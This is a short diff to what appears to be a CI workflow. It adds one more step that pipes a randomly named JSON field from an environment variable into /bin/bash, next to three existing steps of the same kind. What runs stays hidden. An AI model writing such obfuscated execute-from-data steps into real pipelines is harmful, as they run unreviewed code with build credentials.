@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$nab62" | jq -r .onrw0925 | /bin/bash
           echo $nfid45 | jq -r .g690 | /bin/bash
           printf '%s' "$doa905" | jq -r .exybt2411 | /bin/bash
+          printf '%s' "$pu53" | jq -r .mkke7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
